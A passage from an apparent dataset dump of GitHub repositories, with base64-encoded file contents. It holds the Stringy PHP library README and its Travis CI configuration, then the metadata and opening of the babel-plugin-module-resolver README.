bXNyJ10pCgpSZXBsYWNlcyBhbGwgb2NjdXJyZW5jZXMgb2YgJHBhdHRlcm4g
aW4gJHN0ciBieSAkcmVwbGFjZW1lbnQuIEFuIGFsaWFzCmZvciBtYl9lcmVn
X3JlcGxhY2UoKS4gTm90ZSB0aGF0IHRoZSAnaScgb3B0aW9uIHdpdGggbXVs
dGlieXRlIHBhdHRlcm5zCmluIG1iX2VyZWdfcmVwbGFjZSgpIHJlcXVpcmVz
IFBIUCA1LjYrIGZvciBjb3JyZWN0IHJlc3VsdHMuIFRoaXMgaXMgZHVlCnRv
IGEgbGFjayBvZiBzdXBwb3J0IGluIHRoZSBidW5kbGVkIHZlcnNpb24gb2Yg
T25pZ3VydW1hIGluIFBIUCA8IDUuNiwKYW5kIGN1cnJlbnQgdmVyc2lvbnMg
b2YgSEhWTSAoMy44IGFuZCBiZWxvdykuCgpgYGBwaHAKcygnZsOyw7QgJykt
PnJlZ2V4UmVwbGFjZSgnZlvDssO0XStccycsICdiw6DFmScpOyAvLyAnYsOg
xZknCnMoJ2bDsicpLT5yZWdleFJlcGxhY2UoJyjDsiknLCAnXFwxw7QnKTsg
Ly8gJ2bDssO0JwpgYGAKCiMjIyMjIHJlbW92ZUxlZnQoc3RyaW5nICRzdWJz
dHJpbmcpCgpSZXR1cm5zIGEgbmV3IHN0cmluZyB3aXRoIHRoZSBwcmVmaXgg
JHN1YnN0cmluZyByZW1vdmVkLCBpZiBwcmVzZW50LgoKYGBgcGhwCnMoJ2bD
ssO0YsOgxZknKS0+cmVtb3ZlTGVmdCgnZsOyw7QnKTsgLy8gJ2LDoMWZJwpg
YGAKCiMjIyMjIHJlbW92ZVJpZ2h0KHN0cmluZyAkc3Vic3RyaW5nKQoKUmV0
dXJucyBhIG5ldyBzdHJpbmcgd2l0aCB0aGUgc3VmZml4ICRzdWJzdHJpbmcg
cmVtb3ZlZCwgaWYgcHJlc2VudC4KCmBgYHBocApzKCdmw7LDtGLDoMWZJykt
PnJlbW92ZVJpZ2h0KCdiw6DFmScpOyAvLyAnZsOyw7QnCmBgYAoKIyMjIyMg
cmVwZWF0KGludCAkbXVsdGlwbGllcikKClJldHVybnMgYSByZXBlYXRlZCBz
dHJpbmcgZ2l2ZW4gYSBtdWx0aXBsaWVyLiBBbiBhbGlhcyBmb3Igc3RyX3Jl
cGVhdC4KCmBgYHBocApzKCfOsScpLT5yZXBlYXQoMyk7IC8vICfOsc6xzrEn
CmBgYAoKIyMjIyMgcmVwbGFjZShzdHJpbmcgJHNlYXJjaCwgc3RyaW5nICRy
ZXBsYWNlbWVudCkKClJlcGxhY2VzIGFsbCBvY2N1cnJlbmNlcyBvZiAkc2Vh
cmNoIGluICRzdHIgYnkgJHJlcGxhY2VtZW50LgoKYGBgcGhwCnMoJ2bDssO0
IGLDoMWZIGbDssO0IGLDoMWZJyktPnJlcGxhY2UoJ2bDssO0ICcsICcnKTsg
Ly8gJ2LDoMWZIGLDoMWZJwpgYGAKCiMjIyMjIHJldmVyc2UoKQoKUmV0dXJu
cyBhIHJldmVyc2VkIHN0cmluZy4gQSBtdWx0aWJ5dGUgdmVyc2lvbiBvZiBz
dHJyZXYoKS4KCmBgYHBocApzKCdmw7LDtGLDoMWZJyktPnJldmVyc2UoKTsg
Ly8gJ8WZw6Biw7TDsmYnCmBgYAoKIyMjIyMgc2FmZVRydW5jYXRlKGludCAk
bGVuZ3RoIFssIHN0cmluZyAkc3Vic3RyaW5nID0gJycgXSkKClRydW5jYXRl
cyB0aGUgc3RyaW5nIHRvIGEgZ2l2ZW4gbGVuZ3RoLCB3aGlsZSBlbnN1cmlu
ZyB0aGF0IGl0IGRvZXMgbm90CnNwbGl0IHdvcmRzLiBJZiAkc3Vic3RyaW5n
IGlzIHByb3ZpZGVkLCBhbmQgdHJ1bmNhdGluZyBvY2N1cnMsIHRoZQpzdHJp
bmcgaXMgZnVydGhlciB0cnVuY2F0ZWQgc28gdGhhdCB0aGUgc3Vic3RyaW5n
IG1heSBiZSBhcHBlbmRlZCB3aXRob3V0CmV4Y2VlZGluZyB0aGUgZGVzaXJl
ZCBsZW5ndGguCgpgYGBwaHAKcygnV2hhdCBhcmUgeW91ciBwbGFucyB0b2Rh
eT8nKS0+c2FmZVRydW5jYXRlKDIyLCAnLi4uJyk7Ci8vICdXaGF0IGFyZSB5
b3VyIHBsYW5zLi4uJwpgYGAKCiMjIyMjIHNodWZmbGUoKQoKQSBtdWx0aWJ5
dGUgc3RyX3NodWZmbGUoKSBmdW5jdGlvbi4gSXQgcmV0dXJucyBhIHN0cmlu
ZyB3aXRoIGl0cyBjaGFyYWN0ZXJzIGluCnJhbmRvbSBvcmRlci4KCmBgYHBo
cApzKCdmw7LDtGLDoMWZJyktPnNodWZmbGUoKTsgLy8gJ8Ogw7TFmWLDsmYn
CmBgYAoKIyMjIyMgc2x1Z2lmeShbLCBzdHJpbmcgJHJlcGxhY2VtZW50ID0g
Jy0nIFssIHN0cmluZyAkbGFuZ3VhZ2UgPSAnZW4nXV0pCgpDb252ZXJ0cyB0
aGUgc3RyaW5nIGludG8gYW4gVVJMIHNsdWcuIFRoaXMgaW5jbHVkZXMgcmVw
bGFjaW5nIG5vbi1BU0NJSQpjaGFyYWN0ZXJzIHdpdGggdGhlaXIgY2xvc2Vz
dCBBU0NJSSBlcXVpdmFsZW50cywgcmVtb3ZpbmcgcmVtYWluaW5nCm5vbi1B
U0NJSSBhbmQgbm9uLWFscGhhbnVtZXJpYyBjaGFyYWN0ZXJzLCBhbmQgcmVw
bGFjaW5nIHdoaXRlc3BhY2Ugd2l0aAokcmVwbGFjZW1lbnQuIFRoZSByZXBs
YWNlbWVudCBkZWZhdWx0cyB0byBhIHNpbmdsZSBkYXNoLCBhbmQgdGhlIHN0
cmluZwppcyBhbHNvIGNvbnZlcnRlZCB0byBsb3dlcmNhc2UuIFRoZSBsYW5n
dWFnZSBvZiB0aGUgc291cmNlIHN0cmluZyBjYW4KYWxzbyBiZSBzdXBwbGll
ZCBmb3IgbGFuZ3VhZ2Utc3BlY2lmaWMgdHJhbnNsaXRlcmF0aW9uLgoKYGBg
cGhwCnMoJ1VzaW5nIHN0cmluZ3MgbGlrZSBmw7LDtCBiw6DFmScpLT5zbHVn
aWZ5KCk7IC8vICd1c2luZy1zdHJpbmdzLWxpa2UtZm9vLWJhcicKYGBgCgoj
IyMjIyBzbGljZShpbnQgJHN0YXJ0IFssIGludCAkZW5kIF0pCgpSZXR1cm5z
IHRoZSBzdWJzdHJpbmcgYmVnaW5uaW5nIGF0ICRzdGFydCwgYW5kIHVwIHRv
LCBidXQgbm90IGluY2x1ZGluZwp0aGUgaW5kZXggc3BlY2lmaWVkIGJ5ICRl
bmQuIElmICRlbmQgaXMgb21pdHRlZCwgdGhlIGZ1bmN0aW9uIGV4dHJhY3Rz
CnRoZSByZW1haW5pbmcgc3RyaW5nLiBJZiAkZW5kIGlzIG5lZ2F0aXZlLCBp
dCBpcyBjb21wdXRlZCBmcm9tIHRoZSBlbmQKb2YgdGhlIHN0cmluZy4KCmBg
YHBocApzKCdmw7LDtGLDoMWZJyktPnNsaWNlKDMsIC0xKTsgLy8gJ2LDoCcK
YGBgCgojIyMjIyBzcGxpdChzdHJpbmcgJHBhdHRlcm4gWywgaW50ICRsaW1p
dCBdKQoKU3BsaXRzIHRoZSBzdHJpbmcgd2l0aCB0aGUgcHJvdmlkZWQgcmVn
dWxhciBleHByZXNzaW9uLCByZXR1cm5pbmcgYW4KYXJyYXkgb2YgU3RyaW5n
eSBvYmplY3RzLiBBbiBvcHRpb25hbCBpbnRlZ2VyICRsaW1pdCB3aWxsIHRy
dW5jYXRlIHRoZQpyZXN1bHRzLgoKYGBgcGhwCnMoJ2ZvbyxiYXIsYmF6Jykt
PnNwbGl0KCcsJywgMik7IC8vIFsnZm9vJywgJ2JhciddCmBgYAoKIyMjIyMg
c3RhcnRzV2l0aChzdHJpbmcgJHN1YnN0cmluZyBbLCBib29sZWFuICRjYXNl
U2Vuc2l0aXZlID0gdHJ1ZSBdKQoKUmV0dXJucyB0cnVlIGlmIHRoZSBzdHJp
bmcgYmVnaW5zIHdpdGggJHN1YnN0cmluZywgZmFsc2Ugb3RoZXJ3aXNlLgpC
eSBkZWZhdWx0LCB0aGUgY29tcGFyaXNvbiBpcyBjYXNlLXNlbnNpdGl2ZSwg
YnV0IGNhbiBiZSBtYWRlIGluc2Vuc2l0aXZlCmJ5IHNldHRpbmcgJGNhc2VT
ZW5zaXRpdmUgdG8gZmFsc2UuCgpgYGBwaHAKcygnRsOSw5Riw6DFmWJheicp
LT5zdGFydHNXaXRoKCdmw7LDtGLDoMWZJywgZmFsc2UpOyAvLyB0cnVlCmBg
YAoKIyMjIyMgc3RhcnRzV2l0aEFueShzdHJpbmdbXSAkc3Vic3RyaW5ncyBb
LCBib29sZWFuICRjYXNlU2Vuc2l0aXZlID0gdHJ1ZSBdKQoKUmV0dXJucyB0
cnVlIGlmIHRoZSBzdHJpbmcgYmVnaW5zIHdpdGggYW55IG9mICRzdWJzdHJp
bmdzLCBmYWxzZQpvdGhlcndpc2UuIEJ5IGRlZmF1bHQgdGhlIGNvbXBhcmlz
b24gaXMgY2FzZS1zZW5zaXRpdmUsIGJ1dCBjYW4gYmUgbWFkZQppbnNlbnNp
dGl2ZSBieSBzZXR0aW5nICRjYXNlU2Vuc2l0aXZlIHRvIGZhbHNlLgoKYGBg
cGhwCnMoJ0bDksOUYsOgxZliYXonKS0+c3RhcnRzV2l0aEFueShbJ2bDssO0
JywgJ2LDoMWZJ10sIGZhbHNlKTsgLy8gdHJ1ZQpgYGAKCiMjIyMjIHN0cmlw
V2hpdGVzcGFjZSgpCgpTdHJpcCBhbGwgd2hpdGVzcGFjZSBjaGFyYWN0ZXJz
LiBUaGlzIGluY2x1ZGVzIHRhYnMgYW5kIG5ld2xpbmUKY2hhcmFjdGVycywg
YXMgd2VsbCBhcyBtdWx0aWJ5dGUgd2hpdGVzcGFjZSBzdWNoIGFzIHRoZSB0
aGluIHNwYWNlCmFuZCBpZGVvZ3JhcGhpYyBzcGFjZS4KCmBgYHBocApzKCcg
ICDOnyAgICAgz4PPhc6zzrPPgc6xz4bOrc6xz4IgICcpLT5zdHJpcFdoaXRl
c3BhY2UoKTsgLy8gJ86fz4PPhc6zzrPPgc6xz4bOrc6xz4InCmBgYAoKIyMj
IyMgc3Vic3RyKGludCAkc3RhcnQgWywgaW50ICRsZW5ndGggXSkKClJldHVy
bnMgdGhlIHN1YnN0cmluZyBiZWdpbm5pbmcgYXQgJHN0YXJ0IHdpdGggdGhl
IHNwZWNpZmllZCAkbGVuZ3RoLgpJdCBkaWZmZXJzIGZyb20gdGhlIG1iX3N1
YnN0cigpIGZ1bmN0aW9uIGluIHRoYXQgcHJvdmlkaW5nIGEgJGxlbmd0aCBv
ZgpudWxsIHdpbGwgcmV0dXJuIHRoZSByZXN0IG9mIHRoZSBzdHJpbmcsIHJh
dGhlciB0aGFuIGFuIGVtcHR5IHN0cmluZy4KCmBgYHBocApzKCdmw7LDtGLD
oMWZJyktPnN1YnN0cigyLCAzKTsgLy8gJ8O0YsOgJwpgYGAKCiMjIyMjIHN1
cnJvdW5kKHN0cmluZyAkc3Vic3RyaW5nKQoKU3Vycm91bmRzIGEgc3RyaW5n
IHdpdGggdGhlIGdpdmVuIHN1YnN0cmluZy4KCmBgYHBocApzKCcgzZwgJykt
PnN1cnJvdW5kKCfKmCcpOyAvLyAnypggzZwgypgnCmBgYAoKIyMjIyMgc3dh
cENhc2UoKQoKUmV0dXJucyBhIGNhc2Ugc3dhcHBlZCB2ZXJzaW9uIG9mIHRo
ZSBzdHJpbmcuCgpgYGBwaHAKcygnzp3PhM6xzr3Ouc67JyktPnN3YXBDYXNl
KCk7IC8vICfOvc6kzpHOnc6ZzpsnCmBgYAoKIyMjIyMgdGlkeSgpCgpSZXR1
cm5zIGEgc3RyaW5nIHdpdGggc21hcnQgcXVvdGVzLCBlbGxpcHNpcyBjaGFy
YWN0ZXJzLCBhbmQgZGFzaGVzIGZyb20KV2luZG93cy0xMjUyIChjb21tb25s
eSB1c2VkIGluIFdvcmQgZG9jdW1lbnRzKSByZXBsYWNlZCBieSB0aGVpciBB
U0NJSSBlcXVpdmFsZW50cy4KCmBgYHBocApzKCfigJxJIHNlZeKApuKAnScp
LT50aWR5KCk7IC8vICciSSBzZWUuLi4iJwpgYGAKCiMjIyMjIHRpdGxlaXpl
KFssIGFycmF5ICRpZ25vcmVdKQoKUmV0dXJucyBhIHRyaW1tZWQgc3RyaW5n
IHdpdGggdGhlIGZpcnN0IGxldHRlciBvZiBlYWNoIHdvcmQgY2FwaXRhbGl6
ZWQuCkFsc28gYWNjZXB0cyBhbiBhcnJheSwgJGlnbm9yZSwgYWxsb3dpbmcg
eW91IHRvIGxpc3Qgd29yZHMgbm90IHRvIGJlCmNhcGl0YWxpemVkLgoKYGBg
cGhwCiRpZ25vcmUgPSBbJ2F0JywgJ2J5JywgJ2ZvcicsICdpbicsICdvZics
ICdvbicsICdvdXQnLCAndG8nLCAndGhlJ107CnMoJ2kgbGlrZSB0byB3YXRj
aCB0ZWxldmlzaW9uJyktPnRpdGxlaXplKCRpZ25vcmUpOwovLyAnSSBMaWtl
IHRvIFdhdGNoIFRlbGV2aXNpb24nCmBgYAoKIyMjIyMgdG9Bc2NpaShbLCBz
dHJpbmcgJGxhbmd1YWdlID0gJ2VuJyBbLCBib29sICRyZW1vdmVVbnN1cHBv
cnRlZCA9IHRydWUgXV0pCgpSZXR1cm5zIGFuIEFTQ0lJIHZlcnNpb24gb2Yg
dGhlIHN0cmluZy4gQSBzZXQgb2Ygbm9uLUFTQ0lJIGNoYXJhY3RlcnMgYXJl
CnJlcGxhY2VkIHdpdGggdGhlaXIgY2xvc2VzdCBBU0NJSSBjb3VudGVycGFy
dHMsIGFuZCB0aGUgcmVzdCBhcmUgcmVtb3ZlZApieSBkZWZhdWx0LiBUaGUg
bGFuZ3VhZ2Ugb3IgbG9jYWxlIG9mIHRoZSBzb3VyY2Ugc3RyaW5nIGNhbiBi
ZSBzdXBwbGllZApmb3IgbGFuZ3VhZ2Utc3BlY2lmaWMgdHJhbnNsaXRlcmF0
aW9uIGluIGFueSBvZiB0aGUgZm9sbG93aW5nIGZvcm1hdHM6CmVuLCBlbl9H
Qiwgb3IgZW4tR0IuIEZvciBleGFtcGxlLCBwYXNzaW5nICJkZSIgcmVzdWx0
cyBpbiAiw6TDtsO8IiBtYXBwaW5nCnRvICJhZW9ldWUiIHJhdGhlciB0aGFu
ICJhb3UiIGFzIGluIG90aGVyIGxhbmd1YWdlcy4KCmBgYHBocApzKCdmw7LD
tGLDoMWZJyktPnRvQXNjaWkoKTsgLy8gJ2Zvb2JhcicKcygnw6TDtsO8Jykt
PnRvQXNjaWkoKTsgLy8gJ2FvdScKcygnw6TDtsO8JyktPnRvQXNjaWkoJ2Rl
Jyk7IC8vICdhZW9ldWUnCmBgYAoKIyMjIyMgdG9Cb29sZWFuKCkKClJldHVy
bnMgYSBib29sZWFuIHJlcHJlc2VudGF0aW9uIG9mIHRoZSBnaXZlbiBsb2dp
Y2FsIHN0cmluZyB2YWx1ZS4KRm9yIGV4YW1wbGUsICd0cnVlJywgJzEnLCAn
b24nIGFuZCAneWVzJyB3aWxsIHJldHVybiB0cnVlLiAnZmFsc2UnLCAnMCcs
CidvZmYnLCBhbmQgJ25vJyB3aWxsIHJldHVybiBmYWxzZS4gSW4gYWxsIGlu
c3RhbmNlcywgY2FzZSBpcyBpZ25vcmVkLgpGb3Igb3RoZXIgbnVtZXJpYyBz
dHJpbmdzLCB0aGVpciBzaWduIHdpbGwgZGV0ZXJtaW5lIHRoZSByZXR1cm4g
dmFsdWUuCkluIGFkZGl0aW9uLCBibGFuayBzdHJpbmdzIGNvbnNpc3Rpbmcg
b2Ygb25seSB3aGl0ZXNwYWNlIHdpbGwgcmV0dXJuCmZhbHNlLiBGb3IgYWxs
IG90aGVyIHN0cmluZ3MsIHRoZSByZXR1cm4gdmFsdWUgaXMgYSByZXN1bHQg
b2YgYQpib29sZWFuIGNhc3QuCgpgYGBwaHAKcygnT0ZGJyktPnRvQm9vbGVh
bigpOyAvLyBmYWxzZQpgYGAKCiMjIyMjIHRvTG93ZXJDYXNlKCkKCkNvbnZl
cnRzIGFsbCBjaGFyYWN0ZXJzIGluIHRoZSBzdHJpbmcgdG8gbG93ZXJjYXNl
LiBBbiBhbGlhcyBmb3IgUEhQJ3MKbWJfc3RydG9sb3dlcigpLgoKYGBgcGhw
CnMoJ0bDksOUQsOAxZgnKS0+dG9Mb3dlckNhc2UoKTsgLy8gJ2bDssO0YsOg
xZknCmBgYAoKIyMjIyMgdG9TcGFjZXMoWywgdGFiTGVuZ3RoID0gNCBdKQoK
Q29udmVydHMgZWFjaCB0YWIgaW4gdGhlIHN0cmluZyB0byBzb21lIG51bWJl
ciBvZiBzcGFjZXMsIGFzIGRlZmluZWQgYnkKJHRhYkxlbmd0aC4gQnkgZGVm
YXVsdCwgZWFjaCB0YWIgaXMgY29udmVydGVkIHRvIDQgY29uc2VjdXRpdmUg
c3BhY2VzLgoKYGBgcGhwCnMoJyBTdHJpbmcgc3BlZWNoID0gIkhpIicpLT50
b1NwYWNlcygpOyAvLyAnICAgIFN0cmluZyBzcGVlY2ggPSAiSGkiJwpgYGAK
CiMjIyMjIHRvVGFicyhbLCB0YWJMZW5ndGggPSA0IF0pCgpDb252ZXJ0cyBl
YWNoIG9jY3VycmVuY2Ugb2Ygc29tZSBjb25zZWN1dGl2ZSBudW1iZXIgb2Yg
c3BhY2VzLCBhcyBkZWZpbmVkCmJ5ICR0YWJMZW5ndGgsIHRvIGEgdGFiLiBC
eSBkZWZhdWx0LCBlYWNoIDQgY29uc2VjdXRpdmUgc3BhY2VzIGFyZQpjb252
ZXJ0ZWQgdG8gYSB0YWIuCgpgYGBwaHAKcygnICAgIGbDssO0ICAgIGLDoMWZ
JyktPnRvVGFicygpOwovLyAnICAgZsOyw7QgYsOgxZknCmBgYAoKIyMjIyMg
dG9UaXRsZUNhc2UoKQoKQ29udmVydHMgdGhlIGZpcnN0IGNoYXJhY3RlciBv
ZiBlYWNoIHdvcmQgaW4gdGhlIHN0cmluZyB0byB1cHBlcmNhc2UuCgpgYGBw
aHAKcygnZsOyw7QgYsOgxZknKS0+dG9UaXRsZUNhc2UoKTsgLy8gJ0bDssO0
IELDoMWZJwpgYGAKCiMjIyMjIHRvVXBwZXJDYXNlKCkKCkNvbnZlcnRzIGFs
bCBjaGFyYWN0ZXJzIGluIHRoZSBzdHJpbmcgdG8gdXBwZXJjYXNlLiBBbiBh
bGlhcyBmb3IgUEhQJ3MKbWJfc3RydG91cHBlcigpLgoKYGBgcGhwCnMoJ2bD
ssO0YsOgxZknKS0+dG9VcHBlckNhc2UoKTsgLy8gJ0bDksOUQsOAxZgnCmBg
YAoKIyMjIyMgdHJpbShbLCBzdHJpbmcgJGNoYXJzXSkKClJldHVybnMgYSBz
dHJpbmcgd2l0aCB3aGl0ZXNwYWNlIHJlbW92ZWQgZnJvbSB0aGUgc3RhcnQg
YW5kIGVuZCBvZiB0aGUKc3RyaW5nLiBTdXBwb3J0cyB0aGUgcmVtb3ZhbCBv
ZiB1bmljb2RlIHdoaXRlc3BhY2UuIEFjY2VwdHMgYW4gb3B0aW9uYWwKc3Ry
aW5nIG9mIGNoYXJhY3RlcnMgdG8gc3RyaXAgaW5zdGVhZCBvZiB0aGUgZGVm
YXVsdHMuCgpgYGBwaHAKcygnICBmw7LDtGLDoMWZICAnKS0+dHJpbSgpOyAv
LyAnZsOyw7Riw6DFmScKYGBgCgojIyMjIyB0cmltTGVmdChbLCBzdHJpbmcg
JGNoYXJzXSkKClJldHVybnMgYSBzdHJpbmcgd2l0aCB3aGl0ZXNwYWNlIHJl
bW92ZWQgZnJvbSB0aGUgc3RhcnQgb2YgdGhlIHN0cmluZy4KU3VwcG9ydHMg
dGhlIHJlbW92YWwgb2YgdW5pY29kZSB3aGl0ZXNwYWNlLiBBY2NlcHRzIGFu
IG9wdGlvbmFsCnN0cmluZyBvZiBjaGFyYWN0ZXJzIHRvIHN0cmlwIGluc3Rl
YWQgb2YgdGhlIGRlZmF1bHRzLgoKYGBgcGhwCnMoJyAgZsOyw7Riw6DFmSAg
JyktPnRyaW1MZWZ0KCk7IC8vICdmw7LDtGLDoMWZICAnCmBgYAoKIyMjIyMg
dHJpbVJpZ2h0KFssIHN0cmluZyAkY2hhcnNdKQoKUmV0dXJucyBhIHN0cmlu
ZyB3aXRoIHdoaXRlc3BhY2UgcmVtb3ZlZCBmcm9tIHRoZSBlbmQgb2YgdGhl
IHN0cmluZy4KU3VwcG9ydHMgdGhlIHJlbW92YWwgb2YgdW5pY29kZSB3aGl0
ZXNwYWNlLiBBY2NlcHRzIGFuIG9wdGlvbmFsCnN0cmluZyBvZiBjaGFyYWN0
ZXJzIHRvIHN0cmlwIGluc3RlYWQgb2YgdGhlIGRlZmF1bHRzLgoKYGBgcGhw
CnMoJyAgZsOyw7Riw6DFmSAgJyktPnRyaW1SaWdodCgpOyAvLyAnICBmw7LD
tGLDoMWZJwpgYGAKCiMjIyMjIHRydW5jYXRlKGludCAkbGVuZ3RoIFssIHN0
cmluZyAkc3Vic3RyaW5nID0gJycgXSkKClRydW5jYXRlcyB0aGUgc3RyaW5n
IHRvIGEgZ2l2ZW4gbGVuZ3RoLiBJZiAkc3Vic3RyaW5nIGlzIHByb3ZpZGVk
LCBhbmQKdHJ1bmNhdGluZyBvY2N1cnMsIHRoZSBzdHJpbmcgaXMgZnVydGhl
ciB0cnVuY2F0ZWQgc28gdGhhdCB0aGUgc3Vic3RyaW5nCm1heSBiZSBhcHBl
bmRlZCB3aXRob3V0IGV4Y2VlZGluZyB0aGUgZGVzaXJlZCBsZW5ndGguCgpg
YGBwaHAKcygnV2hhdCBhcmUgeW91ciBwbGFucyB0b2RheT8nKS0+dHJ1bmNh
dGUoMTksICcuLi4nKTsgLy8gJ1doYXQgYXJlIHlvdXIgcGwuLi4nCmBgYAoK
IyMjIyMgdW5kZXJzY29yZWQoKQoKUmV0dXJucyBhIGxvd2VyY2FzZSBhbmQg
dHJpbW1lZCBzdHJpbmcgc2VwYXJhdGVkIGJ5IHVuZGVyc2NvcmVzLgpVbmRl
cnNjb3JlcyBhcmUgaW5zZXJ0ZWQgYmVmb3JlIHVwcGVyY2FzZSBjaGFyYWN0
ZXJzICh3aXRoIHRoZSBleGNlcHRpb24Kb2YgdGhlIGZpcnN0IGNoYXJhY3Rl
ciBvZiB0aGUgc3RyaW5nKSwgYW5kIGluIHBsYWNlIG9mIHNwYWNlcyBhcyB3
ZWxsIGFzIGRhc2hlcy4KCmBgYHBocApzKCdUZXN0VUNhc2UnKS0+dW5kZXJz
Y29yZWQoKTsgLy8gJ3Rlc3RfdV9jYXNlJwpgYGAKCiMjIyMjIHVwcGVyQ2Ft
ZWxpemUoKQoKUmV0dXJucyBhbiBVcHBlckNhbWVsQ2FzZSB2ZXJzaW9uIG9m
IHRoZSBzdXBwbGllZCBzdHJpbmcuIEl0IHRyaW1zCnN1cnJvdW5kaW5nIHNw
YWNlcywgY2FwaXRhbGl6ZXMgbGV0dGVycyBmb2xsb3dpbmcgZGlnaXRzLCBz
cGFjZXMsIGRhc2hlcwphbmQgdW5kZXJzY29yZXMsIGFuZCByZW1vdmVzIHNw
YWNlcywgZGFzaGVzLCB1bmRlcnNjb3Jlcy4KCmBgYHBocApzKCdVcHBlciBD
YW1lbC1DYXNlJyktPnVwcGVyQ2FtZWxpemUoKTsgLy8gJ1VwcGVyQ2FtZWxD
YXNlJwpgYGAKCiMjIyMjIHVwcGVyQ2FzZUZpcnN0KCkKCkNvbnZlcnRzIHRo
ZSBmaXJzdCBjaGFyYWN0ZXIgb2YgdGhlIHN1cHBsaWVkIHN0cmluZyB0byB1
cHBlciBjYXNlLgoKYGBgcGhwCnMoJ8+DIGZvbycpLT51cHBlckNhc2VGaXJz
dCgpOyAvLyAnzqMgZm9vJwpgYGAKCiMjIEV4dGVuc2lvbnMKClRoZSBmb2xs
b3dpbmcgaXMgYSBsaXN0IG9mIGxpYnJhcmllcyB0aGF0IGV4dGVuZCBTdHJp
bmd5OgoKICogW1NsaWNlYWJsZVN0cmluZ3ldKGh0dHBzOi8vZ2l0aHViLmNv
bS9kYW5pZWxzdGp1bGVzL1NsaWNlYWJsZVN0cmluZ3kpOgpQeXRob24tbGlr
ZSBzdHJpbmcgc2xpY2VzIGluIFBIUAogKiBbU3ViU3RyaW5neV0oaHR0cHM6
Ly9naXRodWIuY29tL1RDQjEzL1N1YlN0cmluZ3kpOgpBZHZhbmNlZCBzdWJz
dHJpbmcgbWV0aG9kcwoKIyMgVGVzdHMKCkZyb20gdGhlIHByb2plY3QgZGly
ZWN0b3J5LCB0ZXN0cyBjYW4gYmUgcmFuIHVzaW5nIGBwaHB1bml0YAoKIyMg
TGljZW5zZQoKUmVsZWFzZWQgdW5kZXIgdGhlIE1JVCBMaWNlbnNlIC0gc2Vl
IGBMSUNFTlNFLnR4dGAgZm9yIGRldGFpbHMuCg==
",,"bGFuZ3VhZ2U6IHBocAoKcGhwOgogIC0gaGh2bQoKIyBUaGlzIHRyaWdnZXJz
IGJ1aWxkcyB0byBydW4gb24gdGhlIG5ldyBUcmF2aXNDSSBpbmZyYXN0cnVj
dHVyZS4KIyBTZWU6IGh0dHA6Ly9kb2NzLnRyYXZpcy1jaS5jb20vdXNlci93
b3JrZXJzL2NvbnRhaW5lci1iYXNlZC1pbmZyYXN0cnVjdHVyZS8Kc3Vkbzog
ZmFsc2UKCm1hdHJpeDoKICBmYXN0X2ZpbmlzaDogdHJ1ZQogIGluY2x1ZGU6
CiAgICAtIHBocDogNS40CiAgICAgIGVudjogcG9seWZpbGw9J3RydWUnCiAg
ICAtIHBocDogNS40CiAgICAgIGVudjogcG9seWZpbGw9J2ZhbHNlJwogICAg
LSBwaHA6IDUuNQogICAgICBlbnY6IHBvbHlmaWxsPSd0cnVlJwogICAgLSBw
aHA6IDUuNQogICAgICBlbnY6IHBvbHlmaWxsPSdmYWxzZScKICAgIC0gcGhw
OiA1LjYKICAgICAgZW52OiBwb2x5ZmlsbD0ndHJ1ZScKICAgIC0gcGhwOiA1
LjYKICAgICAgZW52OiBwb2x5ZmlsbD0nZmFsc2UnCiAgICAtIHBocDogNy4w
CiAgICAgIGVudjogcG9seWZpbGw9J3RydWUnCiAgICAtIHBocDogNy4wCiAg
ICAgIGVudjogcG9seWZpbGw9J2ZhbHNlJwogICAgLSBwaHA6IDcuMQogICAg
ICBlbnY6IHBvbHlmaWxsPSd0cnVlJwogICAgLSBwaHA6IDcuMQogICAgICBl
bnY6IHBvbHlmaWxsPSdmYWxzZScKCmluc3RhbGw6IHRyYXZpc19yZXRyeSBj
b21wb3NlciBpbnN0YWxsIC0tbm8taW50ZXJhY3Rpb24gLS1wcmVmZXItc291
cmNlCgpiZWZvcmVfc2NyaXB0OgogIC0gdHJhdmlzX3JldHJ5IGNvbXBvc2Vy
IHNlbGYtdXBkYXRlCiAgLSB0cmF2aXNfcmV0cnkgY29tcG9zZXIgaW5zdGFs
bCAtLW5vLWludGVyYWN0aW9uIC0tcHJlZmVyLXNvdXJjZQogIC0gaWYgW1sg
JHBvbHlmaWxsID0gJ2ZhbHNlJyBdXTsgdGhlbiB0cmF2aXNfcmV0cnkgY29t
cG9zZXIgcmVtb3ZlIHN5bWZvbnkvcG9seWZpbGwtbWJzdHJpbmc7IGZpCgpz
Y3JpcHQ6CiAgLSB2ZW5kb3IvYmluL3BocHVuaXQKCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'babel-plugin-module-resolver',40821265,b'Custom module resolver plugin for Babel',b'JavaScript',72,2381,,2381,False,b'https://api.github.com/repos/tleunen/babel-plugin-module-resolver/forks',"IyBiYWJlbC1wbHVnaW4tbW9kdWxlLXJlc29sdmVyClshW01haW50ZW5hbmNl
IFN0YXR1c11bc3RhdHVzLWltYWdlXV1bc3RhdHVzLXVybF0gWyFbTlBNIHZl
cnNpb25dW25wbS1pbWFnZV1dW25wbS11cmxdIFshW0J1aWxkIFN0YXR1cyBM
aW51eF1bY2lyY2xlY2ktaW1hZ2VdXVtjaXJjbGVjaS11cmxdIFshW0J1aWxk
IFN0YXR1cyBXaW5kb3dzXVthcHB2ZXlvci1pbWFnZV1dW2FwcHZleW9yLXVy
bF0gWyFbQ292ZXJhZ2UgU3RhdHVzXVtjb3ZlcmFnZS1pbWFnZV1dW2NvdmVy
YWdlLXVybF0KCkEgW0JhYmVsXShodHRwOi8vYmFiZWxqcy5pbykgcGx1Z2lu
IHRvIGFkZCBhIG5ldyByZXNvbHZlciBmb3IgeW91ciBtb2R1bGVzIHdoZW4g
Y29tcGlsaW5nIHlvdXIgY29kZSB1c2luZyBCYWJlbC4gVGhpcyBwbHVnaW4g
YWxsb3dzIHlvdSB0byBhZGQgbmV3ICJyb290IiBkaXJlY3RvcmllcyB0aGF0
IGNvbnRhaW4geW91ciBtb2R1bGVzLiBJdCBhbHNvIGFsbG93cyB5b3UgdG8g
c2V0dXAgYSBjdXN0b20gYWxpYXMgZm9yIGRpcmVjdG9yaWVzLCBzcGVjaWZp
